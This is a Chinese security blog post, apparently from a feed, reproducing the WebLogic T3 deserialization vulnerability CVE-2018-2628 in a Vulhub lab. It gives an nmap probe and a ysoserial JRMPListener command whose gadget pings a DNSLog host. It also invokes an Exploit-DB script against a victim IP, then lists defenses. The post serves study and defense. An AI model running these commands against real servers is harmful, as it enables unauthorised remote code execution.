    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>简单学习WebLogic T3反序列化漏洞（CVE-2018-2628）。</p><h2 id="0x01-WebLogic-T3反序列化漏洞（CVE-2018-2628）"><a href="#0x01-WebLogic-T3反序列化漏洞（CVE-2018-2628）" class="headerlink" title="0x01 WebLogic T3反序列化漏洞（CVE-2018-2628）"></a>0x01 WebLogic T3反序列化漏洞（CVE-2018-2628）</h2><p>这是xxlegend大佬挖的一个漏洞。</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>用的Vulhub：<a href="https://vulhub.org/#/environments/weblogic/CVE-2018-2628/" target="_blank" rel="noopener">https://vulhub.org/#/environments/weblogic/CVE-2018-2628/</a></p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Oracle WebLogic Server 10.3.6.0, 12.1.3.0, 12.2.1.2 and 12.2.1.3。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>简单地说，就是WebLogic开启了T3协议服务，攻击者可以通过T3协议来进行RMI反序列化漏洞的攻击利用从而RCE。</p><h3 id="使用Nmap脚本探测T3服务"><a href="#使用Nmap脚本探测T3服务" class="headerlink" title="使用Nmap脚本探测T3服务"></a>使用Nmap脚本探测T3服务</h3><p>Nmap的weblogic-t3-info脚本可以探测WebLogic的T3服务是否开启：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -n -v -p7001,7002 172.19.0.1 --script=weblogic-t3-info</span><br></pre></td></tr></table></figure><p>这里探测目标环境7001端口是开启了T3服务的：</p><p><img src="/2021/04/05/浅析WebLogic-T3反序列化漏洞（CVE-2018-2628）/2.png" alt=""></p><p>这里返回目标WebLogic的具体版本号为10.3.6.0以及开启了T3服务等信息，是存在T3反序列化漏洞的，接着进行漏洞复现。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>先在攻击者服务器通过ysoserial来启动一个JRMP服务端，这里使用CommonsCollections1这条Gadget进行反序列化利用，其中通过DNSLog外带验证：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections1 <span class="string">"ping t3.f1gexy.dnslog.cn"</span></span><br></pre></td></tr></table></figure><p>然后，使用这个<a href="https://www.exploit-db.com/exploits/44553" target="_blank" rel="noopener">exploit脚本</a>向目标WebLogic服务器发送报文：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]</span><br></pre></td></tr></table></figure><blockquote><p>其中，<code>[victim ip]</code>和<code>[victim port]</code>是目标weblogic的IP和端口，<code>[path to ysoserial]</code>是本地ysoserial的路径，<code>[JRMPListener ip]</code>和<code>[JRMPListener port]</code>第一步中启动JRMP Server的IP地址和端口。<code>[JRMPClient]</code>是执行JRMPClient的类，可选的值是<code>JRMPClient</code>或<code>JRMPClient2</code>。</p></blockquote><p>最后，看到DNSLog记录：</p><p><img src="/2021/04/05/浅析WebLogic-T3反序列化漏洞（CVE-2018-2628）/1.png" alt=""></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>参考：<a href="https://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA</a></p><p>待分析…</p><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ul><li>升级WebLogic版本；</li><li>关闭T3服务，或控制T3服务的访问权限；</li></ul>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="WebLogic" scheme="https://www.mi1k7ea.com/tags/WebLogic/"/>
    
  </entry>
  
</feed>
